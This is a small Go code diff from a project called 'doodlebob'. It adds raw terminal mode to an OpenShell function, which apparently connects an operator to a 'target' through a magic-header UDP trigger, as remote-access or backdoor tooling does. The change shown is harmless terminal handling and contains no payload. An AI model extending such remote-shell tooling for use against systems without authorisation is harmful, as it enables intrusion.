@@ -12,6 +12,7 @@ import (
 
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/pkg/network"
+	"golang.org/x/term"
 )
 
 // prependHeaderAndSend adds the magic header to the beginning of the message and sends it
@@ -147,6 +148,12 @@ func OpenShell(udpTarget, targetIP, targetPort string) error {
 	defer conn.Close() // Close connection once function returns
 
 	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr().String())
+
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		return err
+	}
+	defer term.Restore(int(os.Stdin.Fd()), oldState)
 
 	// Channel to cleanly block until the session terminates
 	done := make(chan struct{})
